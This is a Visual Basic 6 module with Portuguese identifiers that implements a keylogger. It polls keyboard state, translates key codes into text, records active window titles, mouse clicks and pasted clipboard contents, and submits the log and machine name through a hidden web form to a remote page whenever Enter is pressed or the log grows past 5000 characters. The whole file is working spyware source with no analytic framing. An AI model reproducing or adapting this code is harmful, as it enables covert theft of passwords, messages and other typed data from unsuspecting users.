Attribute VB_Name = "Module1"
Global Logger As String
Global Intervalo As Integer
Global Shift As Integer
Global Tecla(0 To 255) As Integer
Global EnviandoLog As Integer

Global Estado As Integer
Global LogLink As String
Global Maquina As String
Global Delay_EnviarLog As Long
Global Delay_Navigate As Long

Global Janela_Aberta As String
Global Ultima_Janela As String

Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Sub Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long)
Public Declare Sub ExitProcess Lib "kernel32" (ByVal uExitCode As Long)

Public Function VerificaTecla(ByVal vKey As KeyCodeConstants) As Boolean
    On Error Resume Next
    VerificaTecla = GetAsyncKeyState(vKey) And &H8000
End Function

Public Function Enviar_Log()
    If EnviandoLog = 1 Then Exit Function
    If Delay_Navigate < 5 Then Exit Function
    EnviandoLog = 1
    Delay_Navigate = 0

    On Error Resume Next
    Form1.m_WebControl.object.document.getelementbyid("maquina").Value = Maquina
    On Error Resume Next
    Form1.m_WebControl.object.document.getelementbyid("logs").Value = Logger
    On Error Resume Next
    Form1.m_WebControl.object.document.getelementbyid("enviar").Click
End Function

Public Function AddLogger(Apertado As Integer)
    Delay_EnviarLog = 0
    Dim Log As String
    
    Select Case Apertado
        Case 1: Log = "#Click_Direito#"
        Case 2: Log = "#Click_Esquerdo#"
        
        Case 8:
            Call BackSpace
            Exit Function
        Case 9: Log = "#TAB#"
        Case 13: Log = "#ENTER#"
        Case 19: Log = "#PauseBreak#"
        
        Case 27: Log = "#ESC#"
        
        Case 32: Log = " " ' - Espaço
        Case 33: Log = "#PageUp#"
        Case 34: Log = "#PageDown#"
        Case 35: Log = "#END#"
        Case 36: Log = "#HOME#"
        
        Case 37: Log = "#Seta_Esquerda#"
        Case 38: Log = "#Seta_Cima#"
        Case 39: Log = "#Seta_Direita#"
        Case 40: Log = "#Seta_Baixo#"
        
        Case 44: Log = "#PrintScreen#"
        Case 45: Log = "#Insert#"
        Case 46: Log = "#Delete#"
        
        Case 91: Log = "#Windows#"
        Case 92: Log = "#Windows#"
        Case 93: Log = "#Lista#"
        
        Case 96: Log = "0"
        Case 97: Log = "1"
        Case 98: Log = "2"
        Case 99: Log = "3"
        Case 100: Log = "4"
        Case 101: Log = "5"
        Case 102: Log = "6"
        Case 103: Log = "7"
        Case 104: Log = "8"
        Case 105: Log = "9"
        
        Case 106: Log = "*"
        Case 107: Log = "+"
        Case 109: Log = "-"
        Case 111: Log = "/"
        
        Case 144: Log = "#NumLock#"
        Case 145: Log = "#ScrollLock#"
        
        Case 162: Log = "#CTRL#"
        Case 163: Log = "#CTRL#"
        Case 164: Log = "#ALT#"
        Case 165: Log = "#ALT#"
        
        Case 187: Log = "="
        Case 188: Log = ","
        Case 189: Log = "-"
        Case 190: Log = "."
        Case 191: Log = ";"
        Case 192: Log = "'"
        Case 193: Log = "/"
        Case 194: Log = "."
        
        Case 219: Log = ","
        Case 220: Log = "]"
        Case 221: Log = "["
        Case 222: Log = "~"
        
        Case 226: Log = "\"
        
        Case vbKey1: Log = "1"
        Case vbKey2: Log = "2"
        Case vbKey3: Log = "3"
        Case vbKey4: Log = "4"
        Case vbKey5: Log = "5"
        Case vbKey6: Log = "6"
        Case vbKey7: Log = "7"
        Case vbKey8: Log = "8"
        Case vbKey9: Log = "9"
        Case vbKey0: Log = "0"
        
        Case vbKeyA: Log = "a"
        Case vbKeyB: Log = "b"
        Case vbKeyC: Log = "c"
        Case vbKeyD: Log = "d"
        Case vbKeyE: Log = "e"
        Case vbKeyF: Log = "f"
        Case vbKeyG: Log = "g"
        Case vbKeyH: Log = "h"
        Case vbKeyI: Log = "i"
        Case vbKeyJ: Log = "j"
        Case vbKeyK: Log = "k"
        Case vbKeyL: Log = "l"
        Case vbKeyM: Log = "m"
        Case vbKeyN: Log = "n"
        Case vbKeyO: Log = "o"
        Case vbKeyP: Log = "p"
        Case vbKeyQ: Log = "q"
        Case vbKeyR: Log = "r"
        Case vbKeyS: Log = "s"
        Case vbKeyT: Log = "t"
        Case vbKeyU: Log = "u"
        Case vbKeyV: Log = "v"
        Case vbKeyW: Log = "w"
        Case vbKeyX: Log = "x"
        Case vbKeyY: Log = "y"
        Case vbKeyZ: Log = "z"
        
        Case vbKeyF1: Log = "#F1#"
        Case vbKeyF2: Log = "#F2#"
        Case vbKeyF3: Log = "#F3#"
        Case vbKeyF4: Log = "#F4#"
        Case vbKeyF5: Log = "#F5#"
        Case vbKeyF6: Log = "#F6#"
        Case vbKeyF7: Log = "#F7#"
        Case vbKeyF8: Log = "#F8#"
        Case vbKeyF9: Log = "#F9#"
        Case vbKeyF10: Log = "#F10#"
        Case vbKeyF11: Log = "#F11#"
        Case vbKeyF12: Log = "#F12#"
        'Case Else: Log = "#" & Apertado & "#"
    End Select
    
    If VerificaTecla(162) Or VerificaTecla(163) Then
        If VerificaTecla(vbKeyV) Then
            Dim Clip As String
            On Error Resume Next
            Clip = Clipboard.GetText
            Call AddLog(Log + "#CB#" + Clip + "#FechaCB#", 1)
            Call Enviar_Log
            Exit Function
        End If
        
        If VerificaTecla(164) Or VerificaTecla(165) Then
            If Apertado = 49 Then Log = "¹"
            If Apertado = 50 Then Log = "²"
            If Apertado = 51 Then Log = "³"
            If Apertado = 52 Then Log = "£"
            If Apertado = 53 Then Log = "¢"
            If Apertado = 54 Then Log = "¬"
            If Apertado = 187 Then Log = "§"
            
            If Apertado = 220 Then Log = "º"
            If Apertado = 221 Then Log = "ª"
            If Apertado = 193 Then Log = "°"
            If Apertado = 187 Then Log = ""
        End If
    End If
    
    
    If VerificaTecla(160) Or VerificaTecla(161) Then
        If Apertado = 187 Then Log = "+"
        If Apertado = 189 Then Log = "_"
        If Apertado = 192 Then Log = """"
        If Apertado = 219 Then Log = "`"
        If Apertado = 220 Then Log = "}"
        If Apertado = 221 Then Log = "{"
        If Apertado = 188 Then Log = "<"
        If Apertado = 190 Then Log = ">"
        If Apertado = 191 Then Log = ":"
        If Apertado = 193 Then Log = "?"
        If Apertado = 222 Then Log = "^"
        If Apertado = 226 Then Log = "|"
        
        If Apertado >= 48 And Apertado <= 57 Then
            If Apertado = 48 Then Log = ")"
            If Apertado = 49 Then Log = "!"
            If Apertado = 50 Then Log = "@"
            If Apertado = 51 Then Log = "#"
            If Apertado = 52 Then Log = "$"
            If Apertado = 53 Then Log = "%"
            If Apertado = 54 Then Log = "¨"
            If Apertado = 55 Then Log = "&"
            If Apertado = 56 Then Log = "*"
            If Apertado = 57 Then Log = "("
        Else
            Log = UCase(Log)
        End If
    End If
    
    If GetKeyState(20) Then Log = UCase(Log) ' - Caps lock ativado
    
    Call AddLog(Log, 0)
    If Log = "#ENTER#" Then Call Enviar_Log
End Function

Public Function TratarLog()
    Logger = Replace(Logger, "#Windows#" + vbNewLine + "d", "[Windows+D]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "c", "[Ctrl+C]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "C", "[Ctrl+C]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "v", "[Ctrl+V]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "V", "[Ctrl+V]")
    Logger = Replace(Logger, "[Ctrl+V]#CB#", "[Ctrl+V]" & vbNewLine & "#CB#")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "a", "[Ctrl+A]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "A", "[Ctrl+A]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "s", "[Ctrl+S]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "S", "[Ctrl+S]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "t", "[Ctrl+T]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "T", "[Ctrl+T]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "x", "[Ctrl+X]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "X", "[Ctrl+X]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "f", "[Ctrl+F]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "F", "[Ctrl+F]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "n", "[Ctrl+N]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "N", "[Ctrl+N]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "r", "[Ctrl+R]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "R", "[Ctrl+R]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "o", "[Ctrl+O]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "O", "[Ctrl+O]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "p", "[Ctrl+P]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "P", "[Ctrl+P]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "z", "[Ctrl+Z]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "Z", "[Ctrl+Z]")
    
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "#ENTER#", "]Ctrl+ENTER]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + "#ENTER#", "]Ctrl+ENTER]")
    
    ' Compostas
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + vbNewLine + "#TAB#", "[Ctrl+Tab]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + vbNewLine + "#ALT#", "[Ctrl+Alt]")
    Logger = Replace(Logger, "#CTRL#" + vbNewLine + vbNewLine + "#F5#", "[Ctrl+F5]")
    
    Logger = Replace(Logger, "#Ctrl+Alt#" + vbNewLine + vbNewLine + "#Delete#", "[Ctrl+Alt+Del]")
    Logger = Replace(Logger, "#Ctrl+Alt#" + vbNewLine + vbNewLine + "#Delete#", "[Ctrl+Alt+Del]")
    Logger = Replace(Logger, "#ALT#" + vbNewLine + vbNewLine + "#TAB#", "[Alt+Tab]")
    Logger = Replace(Logger, "#ALT#" + vbNewLine + vbNewLine + "#F4#", "[Alt+F4]")
    
    Logger = Replace(Logger, vbNewLine + vbNewLine + vbNewLine + vbNewLine + vbNewLine, vbNewLine)
    Logger = Replace(Logger, vbNewLine + vbNewLine + vbNewLine + vbNewLine, vbNewLine)
    Logger = Replace(Logger, vbNewLine + vbNewLine + vbNewLine, vbNewLine)
    Logger = Replace(Logger, vbNewLine + vbNewLine, vbNewLine)
    Logger = Replace(Logger, vbNewLine, vbNewLine)
    Logger = Replace(Logger, "#ENTER#", vbNewLine)
End Function

Public Function BackSpace()
    On Error Resume Next
    Logger = Mid(Logger, 1, Len(Logger) - 1)
End Function

Public Function AddLog(Log As String, Tipo As Integer)

    If Ultima_Janela <> Janela_Aberta Then
        Ultima_Janela = Janela_Aberta
        Log = Log + vbNewLine + "[Janela: " & Janela_Aberta & "]" + vbNewLine
    End If
    
    If InStr(1, Log, "#") Then
        If Tipo = 0 Then Logger = Logger + vbNewLine + Log + vbNewLine
        If Tipo = 1 Then Logger = Logger + Log + vbNewLine
    Else
        Logger = Logger + Log
    End If
    
    Call TratarLog
    If Len(Logger) >= 5000 Then Call Enviar_Log
End Function
